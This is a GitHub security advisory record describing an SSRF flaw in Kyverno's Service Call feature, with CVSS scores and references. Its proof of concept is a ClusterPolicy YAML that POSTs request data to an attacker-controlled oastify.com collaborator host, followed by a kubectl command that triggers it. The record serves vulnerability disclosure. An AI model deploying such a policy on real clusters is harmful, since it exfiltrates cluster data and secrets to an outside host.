advisory_id: GHSA-459x-q9hg-4gpq
datasource_id: github_osv_importer_v2/GHSA-459x-q9hg-4gpq
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-459x-q9hg-4gpq/GHSA-459x-q9hg-4gpq.json
aliases: []
summary: "Kyverno vulnerable to SSRF via Service Calls\n### Summary\nAn attacker with the ability\
  \ to create Kyverno policies in a Kubernetes cluster can use Service Call functionality to\
  \ perform SSRF to a server under their control in order to exfiltrate data.\n\n### Details\n\
  According to the documentation, Service Call is intended to address services located inside\
  \ the Kubernetes cluster, but this method can also resolve external addresses, which allows\
  \ making requests outside the Kubernetes cluster.\n\nhttps://kyverno.io/docs/writing-policies/external-data-sources/#variables-from-service-calls\n\
  \n### PoC\nCreate a slightly modified Cluster Policy from the documentation. In the url we\
  \ specify the address of a server controlled by the attacker, for example Burp Collaborator.\n\
  ```yaml\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: check-namespaces\
  \      \nspec:\n  rules:\n  - name: call-extension\n    match:\n      any:\n      - resources:\n\
  \          kinds:\n          - ConfigMap\n    context:\n    - name: result\n      apiCall:\n\
  \        method: POST\n        data:\n        - key: namespace\n          value: \"{{request.namespace}}\"\
  \n        service:\n          url: http://bo3gyn4qwyjnrx87fjnrsd4p7gd71xpm.oastify.com/payload\
  \          \n    validate:\n      message: \"namespace {{request.namespace}} is not allowed\"\
  \n      deny:\n        conditions:\n          all:\n          - key: \"{{ result.allowed }}\"\
  \n            operator: Equals\n            value: false\n```\nNow let's create some configmap:\n\
  ```bash\nkubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm\n\
  ```\nLook at the Burp Collaborator logs:\n<img width=\"723\" alt=\"Снимок экрана 2025-02-21\
  \ в 17 31 25\" src=\"https://github.com/user-attachments/assets/9445a71a-6687-430a-8476-3fd546bc2bf2\"\
  \ />\n\n\n### Impact\nAn attacker creating such a policy can obtain the contents of all Kubernetes\
  \ resources created in the cluster, including secrets containing sensitive information."
impacted_packages: []
severities:
  - score: '7.7'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-459x-q9hg-4gpq/GHSA-459x-q9hg-4gpq.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-918
references:
  - url: https://github.com/kyverno/kyverno
    reference_type:
    reference_id:
  - url: https://github.com/kyverno/kyverno/security/advisories/GHSA-459x-q9hg-4gpq
    reference_type:
    reference_id:
  - url: https://pkg.go.dev/vuln/GO-2025-3615
    reference_type:
    reference_id:
